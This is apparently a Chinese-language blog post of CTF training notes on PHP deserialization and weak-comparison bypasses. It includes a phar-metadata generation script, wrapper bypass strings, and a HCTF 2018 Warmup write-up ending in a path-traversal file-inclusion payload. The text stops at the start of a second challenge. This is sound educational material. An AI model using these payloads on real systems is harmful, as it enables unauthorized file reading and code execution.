<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2025 Win 反序列化 | Midnight Phantasmagoria!</title><meta name="author" content="Fischl0527"><meta name="copyright" content="Fischl0527"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="一、讲义内作业 PCRE回溯次数限制：   图中第5步有红颜色，表示匹配不成功。此时b{1,3}已经匹配到了2个字符“b”，准备尝试第三个时，结果发现接下来的字符是“c”。那么就认为b{1,3}就已经匹配完毕。然后状态又回到之前的状态（即第6步，与第4步一样），最后再用子表达式c，去匹配字符“c”。当然，此时整个表达式匹配成功了preg_match的匹配存在回溯，回溯次数上限是1000000次">
<meta property="og:type" content="article">
<meta property="og:title" content="2025 Win 反序列化">
<meta property="og:url" content="https://fischl0527.github.io/2025/01/23/2025Win/2025%20Win%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
<meta property="og:site_name" content="Midnight Phantasmagoria!">
<meta property="og:description" content="一、讲义内作业 PCRE回溯次数限制：   图中第5步有红颜色，表示匹配不成功。此时b{1,3}已经匹配到了2个字符“b”，准备尝试第三个时，结果发现接下来的字符是“c”。那么就认为b{1,3}就已经匹配完毕。然后状态又回到之前的状态（即第6步，与第4步一样），最后再用子表达式c，去匹配字符“c”。当然，此时整个表达式匹配成功了preg_match的匹配存在回溯，回溯次数上限是1000000次">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://fischl0527.github.io/img/cover/2025Win%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png">
<meta property="article:published_time" content="2025-01-23T03:45:14.000Z">
<meta property="article:modified_time" content="2025-07-08T09:28:48.495Z">
<meta property="article:author" content="Fischl0527">
<meta property="article:tag" content="Training">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://fischl0527.github.io/img/cover/2025Win%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "2025 Win 反序列化",
  "url": "https://fischl0527.github.io/2025/01/23/2025Win/2025%20Win%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
  "image": "https://fischl0527.github.io/img/cover/2025Win%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png",
  "datePublished": "2025-01-23T03:45:14.000Z",
  "dateModified": "2025-07-08T09:28:48.495Z",
  "author": [
    {
      "@type": "Person",
      "name": "Fischl0527",
      "url": "https://fischl0527.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/null-5119bf9f9071d171.jpg"><link rel="canonical" href="https://fischl0527.github.io/2025/01/23/2025Win/2025%20Win%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2025 Win 反序列化',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/875E73166434C2B697688F4E9DB5AA6B.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover/2025Win反序列化.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Midnight Phantasmagoria!</span></a><a class="nav-page-title" href="/"><span class="site-name">2025 Win 反序列化</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2025 Win 反序列化</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-01-23T03:45:14.000Z" title="Created 2025-01-23 11:45:14">2025-01-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-07-08T09:28:48.495Z" title="Updated 2025-07-08 17:28:48">2025-07-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/2025Win/">2025Win</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">4.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>19mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><meta name="referrer" content="no-referrer"/>

<h1 id="一、讲义内作业"><a href="#一、讲义内作业" class="headerlink" title="一、讲义内作业"></a><font style="color:#000000;">一、讲义内作业</font></h1><ul>
<li><strong><font style="color:#000000;">PCRE回溯次数限制：</font></strong></li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737463576895-1c81abcb-0bbf-4284-8b59-fc75dd4a6eb8.png"></p>
<p><font style="color:#000000;">图中第5步有红颜色，表示匹配不成功。此时b{1,3}已经匹配到了2个字符“b”，准备尝试第三个时，结果发现接下来的字符是“c”。那么就认为b{1,3}就已经匹配完毕。然后状态又回到之前的状态（即第6步，与第4步一样），最后再用子表达式c，去匹配字符“c”。当然，此时整个表达式匹配成功了preg_match的匹配存在回溯，回溯次数上限是1000000次，超过上限</font><font style="color:#000000;">后函数</font><font style="color:#000000;">直接返回false。</font></p>
<ul>
<li><strong><font style="color:#000000;">fastcoll 工具</font></strong></li>
</ul>
<p><font style="color:#000000;">内容不同但是md5值是相同的</font><font style="color:#000000;">，伟大！无需多言！</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737467807110-f79b6646-16d9-427c-b576-865339160fa0.png"></p>
<p><font style="color:#000000;">其中被解析的字符第三行开头就有不一样的</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737468161698-806eaab2-802e-4d16-a596-c9bcb2137ccd.png"><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737468183901-67b36a9e-e47b-4f30-ac58-40cb80e67491.png"></p>
<ul>
<li><strong><font style="color:#000000;">is_numeric()函数—获取变检测变量是否为数字或数字字符串</font></strong><ul>
<li><font style="color:#000000;">如果var是数字或数字字符串则返回</font><font style="color:#000000;"> TRUE</font><font style="color:#000000;">，否则返回 </font><font style="color:#000000;">FALSE</font></li>
</ul>
</li>
<li><strong><font style="color:#000000;">strcmp()函数—比较字符串大小函数</font></strong><ul>
<li><font style="color:#000000;">strcmp只会处理字符串，如果给个数组的话呢，就会返回NULL</font></li>
</ul>
</li>
<li><strong><font style="color:#000000;">sha1()函数—sha1 加密函数</font></strong><ul>
<li><font style="color:#000000;">以下值在sha1 加密后以0E开头：</font></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aaroZmOk</span><br><span class="line">aaK1STfY</span><br><span class="line">aaO8zKZF</span><br><span class="line">aa3OFF9m</span><br><span class="line">0e1290633704</span><br><span class="line">10932435112</span><br></pre></td></tr></table></figure>

<ul>
<li><strong><font style="color:#000000;">extract()函数</font></strong><ul>
<li><font style="color:#000000;">从数组中将变量到导入到当前符号表,该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表创建对应的一个变量</font></li>
</ul>
</li>
<li><strong><font style="color:#000000;">in_array()函数</font></strong><ul>
<li><font style="color:#000000;">用途：用来判断一个值是否在某一个数组列表里面</font></li>
<li><font style="color:#000000;">缺陷：当第三个参数不设置为true时(即严格模式)，存在自动类型转换(弱比较) ，当输入数字1后再紧跟其他字符串能够Bypass检测数组的功能</font></li>
</ul>
</li>
<li><strong><font style="color:#000000;">parse_str()变量覆盖</font></strong><ul>
<li><font style="color:#000000;">parse_str — 将字符串解析成多个变量：void parse_str ( string </font><font style="color:#000000;">$encoded_string</font><font style="color:#000000;"> [, array </font><font style="color:#000000;">&amp;$result</font><font style="color:#000000;"> ] )</font></li>
<li><font style="color:#000000;">如果设置了第二个变量 result，变量将会以数组元素的形式存入到这个数组，作为替代</font></li>
<li><font style="color:#000000;">解析字符串并注册成变量，在注册变量之前不会验证当前变量是否存在，所以直接覆盖掉已有变量，当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞。</font></li>
</ul>
</li>
<li><strong><font style="color:#000000;">字符串逃逸</font></strong><ul>
<li><font style="color:#000000;">字符串逃逸：</font><font style="color:#000000;">在反序列化范围之外的字符（如花括号外的字符）都会被忽略，不影响反序列化的正常进行，一般分两种：</font><font style="color:#000000;">字符数增多和字符数减少</font></li>
<li><font style="color:#000000;">反序列化之所以存在字符串逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）</font></li>
<li><font style="color:#000000;">当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸</font></li>
<li><font style="color:#000000;">当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替</font></li>
</ul>
</li>
<li><strong><font style="color:#000000;">phar反序列化</font></strong><ul>
<li><font style="color:#000000;">phar反序列化</font><font style="color:#000000;">phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容</font></li>
<li><font style="color:#000000;">phar文件：</font></li>
<li><font style="color:#000000;">在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar:&#x2F;&#x2F;就是一种内置的流包装器</font></li>
<li><font style="color:#000000;">常见的流包装器：</font></li>
</ul>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">漏洞利用条件：phar可以上传到服务器端(存在文件上传)</font></p>
<p><font style="color:#000000;">要有可用的魔术方法作为“跳板”。</font></p>
<p><font style="color:#000000;">文件操作函数的参数可控，且  :  、 &#x2F;  、phar 等特殊字符没有被过滤 </font></p>
<p><font style="color:#000000;">phar生成</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line">    <span class="variable">$o</span> -&gt; data=<span class="string">&#x27;hu3sky&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">绕过方法：当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2:&#x2F;&#x2F;和compress.zlib:&#x2F;&#x2F;等绕过</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br></pre></td></tr></table></figure>

<p><font style="color:rgb(77, 77, 77);">也可以利用其它协议:</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br></pre></td></tr></table></figure>

<h1 id="二、刷题"><a href="#二、刷题" class="headerlink" title="二、刷题"></a><font style="color:#000000;">二、刷题</font></h1><h2 id="（一）-HCTF-2018-Warmup"><a href="#（一）-HCTF-2018-Warmup" class="headerlink" title="（一）[HCTF 2018]Warmup"></a><font style="color:#000000;">（一）[HCTF 2018]Warmup</font></h2><p><font style="color:#000000;">还是这道题，之前写过了，这次复习一下</font><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477382261-04be3b7b-0cb4-4a29-923b-11a2e593af83.png"></p>
<p><font style="color:#000000;">进去还是滑稽图</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477321318-491d83d6-c708-41a8-9e37-75e3c64ba4a7.png"></p>
<p><font style="color:#000000;">看源代码</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477460871-4511fae6-48cb-4adb-9ee5-91b1f17d6f03.png"></p>
<p><font style="color:#000000;">找 source.php 文件，打开后又有一串 PHP 代码</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737477321246-b6e51b6e-d7ca-4ebb-99d8-3bd53e4333cc.png"></p>
<p><font style="color:#000000;">先看一下这个 emmm 类的代码</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">公有静态函数 checkFile</font></li>
<li><font style="color:#000000;">变量 whitelist 包含 source.php 和 hint.php 文件</font></li>
<li><font style="color:#000000;">第一个 if</font><ul>
<li><font style="color:#000000;">条件： page 里为随机值或者 page 里的值的长度为 0</font></li>
<li><font style="color:#000000;">输出    you can’t see it</font></li>
<li><font style="color:#000000;">返回值为 false</font></li>
</ul>
</li>
<li><font style="color:#000000;">第二个 if</font><ul>
<li><font style="color:#000000;">条件：</font><font style="color:#000000;">page 是否在whitelist 内</font></li>
<li><font style="color:#000000;">返回值为真</font></li>
</ul>
</li>
<li><font style="color:#000000;">对 page 用mb_substr 函数</font><ul>
<li><font style="color:#000000;">mb_substr 函数的参数里有一个mb_strpos 函数</font></li>
<li><font style="color:#000000;">mb_strpos 函数中先是把?连接在 page 变量的后面之后返回?的位置，即 page 的字符串长度加 1</font></li>
<li><font style="color:#000000;">之后执行mb_substr 函数，从 0 开始，即返回 page 里的字符串</font></li>
<li><font style="color:#000000;"> 该代码的作用是从 page 中提取? 前的部分内容。如果 page 中没有 ?，它会返回整个字符串。 通过这种方式，可以有效移除 page 中的查询参数部分  </font></li>
</ul>
</li>
<li><font style="color:#000000;">第三个 if</font><ul>
<li><font style="color:#000000;">条件：page 是否在whitelist 内</font></li>
<li><font style="color:#000000;">返回值为真</font></li>
</ul>
</li>
<li><font style="color:#000000;">对 page 进行 url 加密</font></li>
<li><font style="color:#000000;">对 page 用mb_substr 函数（含义同上）</font></li>
<li><font style="color:#000000;">第四个 if</font><ul>
<li><font style="color:#000000;">条件：</font><font style="color:#000000;">page 是否在whitelist 内</font></li>
<li><font style="color:#000000;">返回值为真</font></li>
</ul>
</li>
<li><font style="color:#000000;">输出you can’t see it</font></li>
<li><font style="color:#000000;">返回值为 false</font></li>
</ul>
<p><font style="color:#000000;">之后看一下外面的 if 代码</font></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>

<ul>
<li><font style="color:#000000;">条件：file 的 REQUEST 传参不为空 且 file 字符串长度不为 0 且 checkFile 函数返回值为 true</font></li>
<li><font style="color:#000000;">如果条件为真则把 file 请求的文件包含进来</font></li>
<li><font style="color:#000000;">如果条件为假则输出滑稽图</font></li>
</ul>
<p><font style="color:#000000;">所以先让 file 的值为 hint.php 把该文件包含进来，不包含 source.php 文件的原因为该文件就是 source.php</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737479563341-1998a6bf-dd0e-437d-9469-246d277d5f12.png"></p>
<p><font style="color:#000000;">所以之后可以用用 ? 跳过文件检测（该函数只截取到?之前的内容）</font></p>
<p><font style="color:#000000;">一层一层在文件找ffffllllaaaagggg 就行</font></p>
<p><font style="color:#000000;">构造 playload:</font></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p><font style="color:#000000;">拿到 flag</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737480162886-61e6f2f8-3a55-4f2c-90de-872ffd5f396f.png"></p>
<h2 id="（二）-FSCTF-2023-ez-php2"><a href="#（二）-FSCTF-2023-ez-php2" class="headerlink" title="（二）[FSCTF 2023]ez_php2"></a><font style="color:#000000;">（二）</font><font style="color:#000000;">[FSCTF 2023]ez_php2</font></h2><p><font style="color:#000000;">打开靶场发现以下 PHP 代码：</font></p>
<p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1737510177627-814a6d15-d95b-4dd3-9de6-2330be2977f9.png"></p>
<p><font style="color:#000000;">先每个类进行分析</font></p>
<p><font style="color:#000000;">Class Rd:</font></p>
